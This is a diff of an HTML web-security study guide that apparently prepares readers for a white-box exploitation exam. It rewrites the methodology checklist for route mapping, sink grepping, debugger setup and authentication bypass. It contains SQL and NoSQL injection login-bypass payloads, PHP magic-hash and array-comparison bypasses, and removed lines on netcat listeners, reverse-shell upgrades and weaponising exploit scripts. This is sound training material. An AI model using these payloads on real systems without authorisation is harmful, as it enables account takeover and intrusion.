@@ -42,38 +42,38 @@
   <meta name="twitter:image" content="./img/favicon.png">
   <style>
   /* Index sidebar color flow (light -> medium, readable with dark text) */
-  .section-flow-1{background-color:#e3f4f1;}
-  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#e3f4f1;}
-  .section-flow-2{background-color:#dcf0ed;}
-  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#dcf0ed;}
-  .section-flow-3{background-color:#d5ede8;}
-  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#d5ede8;}
-  .section-flow-4{background-color:#cee9e4;}
-  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#cee9e4;}
-  .section-flow-5{background-color:#c7e5e0;}
-  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#c7e5e0;}
-  .section-flow-6{background-color:#c0e1db;}
-  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#c0e1db;}
-  .section-flow-7{background-color:#b9ded7;}
-  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#b9ded7;}
-  .section-flow-8{background-color:#b2dad3;}
-  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#b2dad3;}
-  .section-flow-9{background-color:#acd6ce;}
-  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#acd6ce;}
-  .section-flow-10{background-color:#a5d2ca;}
-  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#a5d2ca;}
-  .section-flow-11{background-color:#9ecfc6;}
-  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#9ecfc6;}
-  .section-flow-12{background-color:#97cbc1;}
-  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:#97cbc1;}
-  .section-flow-13{background-color:#90c7bd;}
-  .section-flow-13 .dropdown-container,.section-flow-13 .nested-dropdown-container{background-color:#90c7bd;}
-  .section-flow-14{background-color:#89c3b9;}
-  .section-flow-14 .dropdown-container,.section-flow-14 .nested-dropdown-container{background-color:#89c3b9;}
-  .section-flow-15{background-color:#82c0b4;}
-  .section-flow-15 .dropdown-container,.section-flow-15 .nested-dropdown-container{background-color:#82c0b4;}
-  .section-flow-16{background-color:#7bbcb0;}
-  .section-flow-16 .dropdown-container,.section-flow-16 .nested-dropdown-container{background-color:#7bbcb0;}
+  .section-flow-1{background-color:#f3f7f6;}
+  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#f3f7f6;}
+  .section-flow-2{background-color:#c1dfda;}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#c1dfda;}
+  .section-flow-3{background-color:#8fd1c6;}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#8fd1c6;}
+  .section-flow-4{background-color:#60ccba;}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#60ccba;}
+  .section-flow-5{background-color:#37cbb2;}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#37cbb2;}
+  .section-flow-6{background-color:#29baa2;}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#29baa2;}
+  .section-flow-7{background-color:#21ad95;}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#21ad95;}
+  .section-flow-8{background-color:#1da68f;}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#1da68f;}
+  .section-flow-9{background-color:#1da68f;}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#1da68f;}
+  .section-flow-10{background-color:#21ad95;}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#21ad95;}
+  .section-flow-11{background-color:#29baa2;}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#29baa2;}
+  .section-flow-12{background-color:#37cbb2;}
+  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:#37cbb2;}
+  .section-flow-13{background-color:#60ccba;}
+  .section-flow-13 .dropdown-container,.section-flow-13 .nested-dropdown-container{background-color:#60ccba;}
+  .section-flow-14{background-color:#8fd1c6;}
+  .section-flow-14 .dropdown-container,.section-flow-14 .nested-dropdown-container{background-color:#8fd1c6;}
+  .section-flow-15{background-color:#c1dfda;}
+  .section-flow-15 .dropdown-container,.section-flow-15 .nested-dropdown-container{background-color:#c1dfda;}
+  .section-flow-16{background-color:#f3f7f6;}
+  .section-flow-16 .dropdown-container,.section-flow-16 .nested-dropdown-container{background-color:#f3f7f6;}
   </style>
 </head>
 
@@ -1087,102 +1087,1364 @@ getattr(target, 'attr')  via |attr() filter
 request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
 
               <h2 id="methodology">15. Methodology</h2>
-              <p>A repeatable, exam-ready workflow from receiving the source tree to delivering a single automated exploit script per target. Complete each stage fully before advancing &mdash; an unverified assumption here causes silent failure two stages later. Keep a running PoC Python script that you extend at each stage.</p>
+<p>Operator-checklist methodology for white-box web application testing. Each phase walks a vulnerability class end-to-end: identify the sink, trace the taint, confirm exploitability, chain to RCE or account takeover, write the exploit script.</p>
 
-              <h3 id="methodology-preexam">15.1 Pre-Exam Setup</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-preexam-burp"> Burp Suite Pro launched with proxy listener and target-scope rules ready</li>
-                <li><input type="checkbox" data-id="w-preexam-ide"> IDE opened with the source tree indexed (VS Code / IntelliJ / PyCharm) for the target&rsquo;s language</li>
-                <li><input type="checkbox" data-id="w-preexam-debug"> Remote debugger configured for the target language (Xdebug / debugpy / IntelliJ JDWP / node --inspect)</li>
-                <li><input type="checkbox" data-id="w-preexam-tools"> Tools accessible: <code>jwt_tool</code>, <code>ysoserial</code> / <code>ysoserial.net</code> / <code>PHPGGC</code>, <code>tplmap</code>, <code>sqlmap</code>, <code>semgrep</code></li>
-                <li><input type="checkbox" data-id="w-preexam-decompile"> Decompilers ready: <code>dnSpy</code>/<code>ILSpy</code> for .NET, <code>jd-gui</code>/<code>CFR</code>/<code>Procyon</code> for Java</li>
-                <li><input type="checkbox" data-id="w-preexam-template"> Python exploit skeleton template (Session, stage functions, argparse) saved as <code>exploit_template.py</code></li>
-                <li><input type="checkbox" data-id="w-preexam-nc"> Netcat listener ready: <code>nc -lvnp 443</code></li>
-                <li><input type="checkbox" data-id="w-preexam-snapshot"> Snapshot the target VM before any exploitation attempt (clean revert path)</li>
-              </ul>
+<h3 id="methodology-source-review">15.1 Source Code Review</h3>
+<p>Map the application before hunting bugs. Understand routes, sinks, and data flow first &mdash; the rest of the methodology depends on this phase.</p>
+<h4 id="methodology-source-review-route-mapping">15.1.1 Route &amp; Endpoint Mapping</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-0"> Enumerate every route the application exposes:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-0-0"> Flask / Django: <code>grep -rn "@app.route\|@blueprint.route\|path(" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-0-1"> Express: <code>grep -rn "app.get\|app.post\|app.put\|app.delete\|router." src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-0-2"> Spring: <code>grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-0-3"> PHP: <code>grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|Route::" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-0-4"> .NET: <code>grep -rn "\[HttpGet\|\[HttpPost\|\[Route" src/</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Route enumeration — run all greps and collate into a route map
+grep -rn "@app.route\|@blueprint.route" src/        # Flask / Django
+grep -rn "app.get\|app.post\|router\." src/          # Express
+grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src/  # Spring
+grep -rn "\$_GET\|\$_POST\|\$_REQUEST" src/          # PHP
+grep -rn "\[HttpGet\]\|\[HttpPost\]\|\[Route" src/  # .NET</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-1"> Identify pre-auth vs post-auth endpoints:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-1-0"> Check for middleware / decorators that enforce authentication</li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-1-1"> Map which routes skip auth checks &mdash; these are the primary targets</li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-1-2"> Note any role-based access control (RBAC) decorators</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-2"> Document the API surface:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-2-0"> REST endpoints with methods and parameters</li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-2-1"> GraphQL schemas if present</li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-2-2"> WebSocket handlers</li>
+        <li><input type="checkbox" data-id="methodology-source-review-route-mapping-wf-2-3"> File upload endpoints</li>
+      </ul>
+    </li>
+  </ul>
 
-              <h3 id="methodology-environment-recon">15.2 Environment &amp; App Recon</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-recon-tech"> Identify the tech stack (language, framework, version) from config files, error pages, headers, and source</li>
-                <li><input type="checkbox" data-id="w-recon-routes"> Enumerate all routes/endpoints; note which are pre-auth vs. require authentication</li>
-                <li><input type="checkbox" data-id="w-recon-db"> Identify the database type and driver; check for raw query construction vs. parameterized</li>
-                <li><input type="checkbox" data-id="w-recon-deps"> Review <code>composer.json</code>, <code>package.json</code>, <code>pom.xml</code>, <code>requirements.txt</code>, <code>*.csproj</code> for vulnerable dependencies</li>
-                <li><input type="checkbox" data-id="w-recon-tpl"> Identify the template engine (Jinja2, Twig, Freemarker, EJS, Handlebars, Pug, ERB) &mdash; informs SSTI &amp; prototype-pollution gadgets</li>
-                <li><input type="checkbox" data-id="w-recon-serial"> Identify any serialization in use (cookies, sessions, queues) and the formatter (BinaryFormatter, ObjectInputStream, unserialize, pickle, node-serialize)</li>
-                <li><input type="checkbox" data-id="w-recon-waf"> Check whether a WAF is in front and read its ruleset if accessible (Coraza/ModSecurity rules in repo)</li>
-              </ul>
+<h4 id="methodology-source-review-sink-identification">15.1.2 Dangerous Sink Identification</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-0"> Grep for OS command execution sinks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-0-0"> PHP: <code>grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-0-1"> Python: <code>grep -rn "os\.system\|subprocess\|eval\|exec\|render_template_string" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-0-2"> Java: <code>grep -rn "Runtime\.exec\|ProcessBuilder\|ScriptEngine\|EL.*Expression" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-0-3"> Node.js: <code>grep -rn "eval\|exec\|execSync\|spawn\|Function(" src/</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-1"> Grep for deserialization sinks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-1-0"> .NET: <code>grep -rn "BinaryFormatter\|NetDataContract\|SoapFormatter\|LosFormatter\|XmlSerializer" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-1-1"> Java: <code>grep -rn "readObject\|XMLDecoder\|fromXML\|ObjectInputStream" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-1-2"> PHP: <code>grep -rn "unserialize\s*(" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-1-3"> Node.js: <code>grep -rn "node-serialize\|js-yaml\.load" src/</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Dangerous sink grep — OS command execution
+grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/     # PHP
+grep -rn "os\.system\|subprocess\|eval\|exec\|render_template_string" src/      # Python
+grep -rn "Runtime\.exec\|ProcessBuilder\|ScriptEngine" src/                     # Java
+grep -rn "eval\|exec\|execSync\|spawn\|Function(" src/                          # Node.js
 
-              <h3 id="methodology-source-review">15.3 Source Review (Sources &rarr; Sinks)</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-rev-sources"> Grep every user-controlled input source: <code>$_GET/$_POST</code>, <code>request.args/json</code>, <code>req.body</code>, <code>getParameter</code>, <code>HttpContext.Request</code></li>
-                <li><input type="checkbox" data-id="w-rev-sinks"> Grep every dangerous sink: SQL queries, <code>eval</code>/<code>exec</code>, deserializers, template engines, file ops, XML parsers</li>
-                <li><input type="checkbox" data-id="w-rev-taint"> Trace each source to each sink; mark which have sanitization and whether it can be bypassed</li>
-                <li><input type="checkbox" data-id="w-rev-auth"> Read the auth middleware in detail: what does it check, how is the session built, what can bypass it?</li>
-                <li><input type="checkbox" data-id="w-rev-csrf"> Read CSRF protection: is the token tied to the session, is it validated on every state-changing request, is CORS permissive?</li>
-                <li><input type="checkbox" data-id="w-rev-xml"> If XML is parsed, check parser configuration: are external entities allowed? Default Java/.NET pre-4.5.2 parsers usually are</li>
-              </ul>
+# Dangerous sink grep — deserialization
+grep -rn "BinaryFormatter\|NetDataContract\|SoapFormatter\|LosFormatter" src/   # .NET
+grep -rn "readObject\|XMLDecoder\|ObjectInputStream" src/                       # Java
+grep -rn "unserialize\s*(" src/                                                 # PHP</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-2"> Grep for SQL query construction:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-2-0"> String concatenation in queries: <code>grep -rn "SELECT.*+\|INSERT.*+\|UPDATE.*+\|DELETE.*+" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-2-1"> Parameterized queries are safe &mdash; focus on raw string concatenation</li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-2-2"> ORM raw methods: <code>grep -rn "raw\|execute\|rawQuery\|createNativeQuery" src/</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-3"> Run automated static analysis:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-3-0"> Semgrep: <code>semgrep --config p/php-security src/</code> (also <code>p/java-security</code>, <code>p/nodejs-security</code>)</li>
+        <li><input type="checkbox" data-id="methodology-source-review-sink-identification-wf-3-1"> CodeQL if the codebase is large enough to warrant it</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Automated static analysis with Semgrep
+semgrep --config p/php-security src/
+semgrep --config p/java-security src/
+semgrep --config p/nodejs-security src/
+semgrep --config p/python-security src/</code></pre>
+<p><strong>References:</strong> <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer">OWASP Top 10</a> &middot; <a href="https://cwe.mitre.org/" target="_blank" rel="noopener noreferrer">MITRE CWE</a></p>
 
-              <h3 id="methodology-auth-bypass">15.4 Authentication Bypass</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-auth-sqli"> Try SQLi in every login/reset/registration field; read the query from source to craft a precise payload</li>
-                <li><input type="checkbox" data-id="w-auth-logic"> Check for type confusion, magic hashes, and logic flaws in the reset flow</li>
-                <li><input type="checkbox" data-id="w-auth-jwt"> Decode and test JWT: weak secret, algorithm confusion, &ldquo;alg:none&rdquo;, accept-non-string subject</li>
-                <li><input type="checkbox" data-id="w-auth-reset"> Reset-token analysis: predictable seed (time/PID), no invalidation after use, host-header injection, parameter pollution</li>
-                <li><input type="checkbox" data-id="w-auth-session"> Look for session fixation, predictable session IDs, missing post-login regeneration</li>
-                <li><input type="checkbox" data-id="w-auth-cors"> Confirm whether CORS misconfig + CSRF can produce a pre-auth account takeover (the Concord chain)</li>
-              </ul>
+<h4 id="methodology-source-review-taint-tracing">15.1.3 Taint Tracing</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-0"> For each dangerous sink found, trace backward to the input source:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-0-0"> Identify where user input enters: query params, POST body, headers, cookies, file uploads</li>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-0-1"> Follow the variable through every function call, assignment, and transformation</li>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-0-2"> Note any sanitisation or validation along the path</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-1"> Determine if sanitisation is bypassable:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-1-0"> Blacklist-based filtering &mdash; look for bypass payloads</li>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-1-1"> Encoding/decoding mismatches (double encoding, charset tricks)</li>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-1-2"> Type confusion or casting issues</li>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-1-3"> Race conditions in check-then-use patterns</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-2"> Confirm reachability without authentication where possible:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-2-0"> Pre-auth sinks are highest value</li>
+        <li><input type="checkbox" data-id="methodology-source-review-taint-tracing-wf-2-1"> Post-auth sinks still matter for privilege escalation chains</li>
+      </ul>
+    </li>
+  </ul>
 
-              <h3 id="methodology-escalate-rce">15.5 Escalate to RCE</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-rce-sqlifile"> SQLi &rarr; file write (MySQL OUTFILE, PostgreSQL <code>COPY TO</code>, MSSQL <code>xp_cmdshell</code>)</li>
-                <li><input type="checkbox" data-id="w-rce-pgudf"> SQLi &rarr; PostgreSQL extension/UDF or <code>COPY TO PROGRAM</code> for direct command execution</li>
-                <li><input type="checkbox" data-id="w-rce-ssti"> SSTI &rarr; engine-specific RCE (Jinja2 subclasses, Freemarker Execute, Twig filter chain, ERB backticks)</li>
-                <li><input type="checkbox" data-id="w-rce-deser"> Deserialization &rarr; RCE via gadget chain (<code>ysoserial</code>, <code>PHPGGC</code>, <code>ysoserial.net</code>)</li>
-                <li><input type="checkbox" data-id="w-rce-upload"> File upload bypass + LFI to include/execute the uploaded shell</li>
-                <li><input type="checkbox" data-id="w-rce-xss"> XSS &rarr; admin session steal &rarr; authenticated RCE endpoint</li>
-                <li><input type="checkbox" data-id="w-rce-cmdi"> Command injection via <code>system()</code>/<code>exec()</code> with missing input sanitization</li>
-                <li><input type="checkbox" data-id="w-rce-eval"> <code>eval()</code> filter bypass via string concatenation, reflection, or alternate encodings</li>
-                <li><input type="checkbox" data-id="w-rce-xxe"> XXE &rarr; read sensitive config, then chain (HSQLDB JDBC, Java routines, or write a web shell via SQLi creds)</li>
-                <li><input type="checkbox" data-id="w-rce-ssrf"> SSRF + headless Chrome &rarr; read internal admin API tokens &rarr; admin RCE</li>
-                <li><input type="checkbox" data-id="w-rce-pp"> Prototype pollution + template gadget (EJS / Pug / Handlebars) &rarr; RCE</li>
-              </ul>
+<h4 id="methodology-source-review-debugger-setup">15.1.4 Debugger Setup</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-0"> PHP &mdash; Xdebug + VS Code:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-0-0"> Install: <code>pecl install xdebug</code> or <code>apt install php-xdebug</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-0-1"> Config: <code>xdebug.mode=debug</code>, <code>xdebug.start_with_request=yes</code>, <code>xdebug.client_host=host.docker.internal</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-0-2"> VS Code: install PHP Debug extension, set breakpoints, launch listener on port 9003</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-1"> Node.js &mdash; Inspector protocol:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-1-0"> <code>node --inspect-brk=0.0.0.0:9229 app.js</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-1-1"> Chrome DevTools: <code>chrome://inspect</code> &rarr; configure target &rarr; attach</li>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-1-2"> VS Code: attach to running process via launch.json</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-2"> Java &mdash; JDWP remote debug:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-2-0"> <code>JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-2-1"> IntelliJ / VS Code: remote debug configuration targeting port 5005</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-3"> Python &mdash; debugpy:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-3-0"> <code>python3 -m debugpy --listen 0.0.0.0:5678 --wait-for-client app.py</code></li>
+        <li><input type="checkbox" data-id="methodology-source-review-debugger-setup-wf-3-1"> VS Code: Python attach configuration targeting port 5678</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP — Xdebug config (add to php.ini or xdebug.ini)
+xdebug.mode=debug
+xdebug.start_with_request=yes
+xdebug.client_host=host.docker.internal
+xdebug.client_port=9003
 
-              <h3 id="methodology-debug-confirm">15.6 Debugger-Verified Confirmation</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-debug-bp"> Set a breakpoint at the sink (the SQL execute call, the deserializer, the eval) in the remote debugger</li>
-                <li><input type="checkbox" data-id="w-debug-trace"> Send your candidate payload; confirm in the debugger that the exact bytes you sent reach the sink unaltered (or with the filtering you expect)</li>
-                <li><input type="checkbox" data-id="w-debug-stack"> Read the call stack at the breakpoint to identify any pre-sink sanitization you missed</li>
-                <li><input type="checkbox" data-id="w-debug-state"> Inspect application state (current user, role, CSRF token) to confirm the auth bypass actually elevated context</li>
-                <li><input type="checkbox" data-id="w-debug-iterate"> If the payload is mutated before the sink, work backward: which transformation function, and how to construct an input that produces the desired sink-input post-transform?</li>
-              </ul>
+# Node.js — start with inspector
+node --inspect-brk=0.0.0.0:9229 app.js
 
-              <h3 id="methodology-weaponize">15.7 Weaponise the Script</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-script-stages"> Refactor manual Burp clicks into Python <code>requests.Session()</code> calls, one function per stage</li>
-                <li><input type="checkbox" data-id="w-script-args"> Top-of-file constants for TARGET, LHOST, LPORT &mdash; the script must retarget with a single edit</li>
-                <li><input type="checkbox" data-id="w-script-assert"> Add an assertion after each stage that confirms it succeeded (auth bypass returned a session, SQLi returned data, web shell wrote to disk)</li>
-                <li><input type="checkbox" data-id="w-script-payload"> Parameterise the shellcode/payload: take <code>LHOST</code>/<code>LPORT</code> from <code>argparse</code> or env vars so the examiner can swap them</li>
-                <li><input type="checkbox" data-id="w-script-revert"> Test against a freshly reverted lab: the script must succeed in a single run, not after manual setup</li>
-              </ul>
+# Java — JDWP remote debug (add to JAVA_OPTS)
+JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"
 
-              <h3 id="methodology-privesc">15.8 Post-Exploitation &amp; Privilege Escalation</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-post-shell"> Catch the reverse shell, upgrade to a proper TTY (<code>python3 -c "import pty; pty.spawn('/bin/bash')"</code>)</li>
-                <li><input type="checkbox" data-id="w-post-enum"> Run <code>whoami</code>, <code>id</code>, <code>hostname</code>, <code>uname -a</code> for proof</li>
-                <li><input type="checkbox" data-id="w-post-privesc"> Look for SUID, sudo NOPASSWD, cron, writable PATH, capabilities; escalate to root if the exam requires it</li>
-                <li><input type="checkbox" data-id="w-post-cleanup"> Remove dropped payloads (web shells, temp files) where possible &mdash; the exam expects clean labs</li>
-              </ul>
+# Python — debugpy
+python3 -m debugpy --listen 0.0.0.0:5678 --wait-for-client app.py</code></pre>
 
-              <h3 id="methodology-reliability">15.9 Reliability &amp; Documentation</h3>
-              <ul>
-                <li><input type="checkbox" data-id="w-rel-test"> Re-run the script against a clean revert at least twice in a row &mdash; confirm 100% success rate</li>
-                <li><input type="checkbox" data-id="w-rel-time"> Confirm the full chain finishes in under a few minutes (timeouts are an automatic fail)</li>
-                <li><input type="checkbox" data-id="w-rel-comments"> Comment every hardcoded offset, route, parameter name, and version-specific value</li>
-                <li><input type="checkbox" data-id="w-rel-proof"> Screenshot the script&rsquo;s output side-by-side with the shell, <code>whoami</code>, and the proof file content</li>
-                <li><input type="checkbox" data-id="w-rel-report"> Document the chain in the report: vulnerability class per stage, source-code line numbers, payload, debugger evidence</li>
-              </ul>
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a> &middot; <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener noreferrer">OWASP Cheat Sheet Series</a></p>
 
-              <h2 id="references">16. References</h2>
+<h3 id="methodology-auth-bypass">15.2 Authentication Bypass</h3>
+<p>Test every authentication mechanism for logic flaws before moving to injection-based attacks.</p>
+<h4 id="methodology-auth-bypass-sqli-auth">15.2.1 SQL Injection Auth Bypass</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-0"> Test the login form with classic SQLi payloads:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-0-0"> Username field: <code>admin'--</code>, <code>admin'#</code>, <code>' OR '1'='1</code></li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-0-1"> Password field: <code>' OR 1=1--</code>, <code>' OR 1=1#</code></li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-0-2"> Both fields: <code>admin' AND 1=1--</code> (confirm boolean blind)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-1"> Test for second-order SQLi in registration / profile update:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-1-0"> Register with a username containing SQL metacharacters</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-1-1"> Trigger the injection when the stored value is used in a later query</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-2"> Check for NoSQL injection on MongoDB backends:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-2-0"> JSON body: <code>{{"user": {{"$ne": ""}}, "pass": {{"$ne": ""}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-sqli-auth-wf-2-1"> Query string: <code>user[$ne]=&pass[$ne]=</code></li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger SQLi</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SQLi</a></p>
+
+<h4 id="methodology-auth-bypass-type-juggling">15.2.2 Type Juggling &amp; Magic Hashes</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-0"> Test PHP loose comparison (==) bypasses:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-0-0"> Send integer <code>0</code> where string is expected: <code>0 == "admin"</code> evaluates to TRUE in PHP</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-0-1"> JSON content type allows type control: <code>{{"user": 0, "pass": "anything"}}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-1"> Test magic hash collisions:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-1-0"> MD5 of <code>240610708</code> = <code>0e462097431906509019562988736854</code> &mdash; evaluates to 0 in loose comparison</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-1-1"> SHA1 of <code>10932435112</code> = <code>0e07766915004133176347055865026311692244</code></li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-1-2"> If the app compares hashes with <code>==</code> instead of <code>===</code>, supply a magic-hash input</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-2"> Test array parameter injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-2-0"> Send <code>pass[]=&pass[]=</code> to make <code>strcmp()</code> return NULL (treated as 0 / equal)</li>
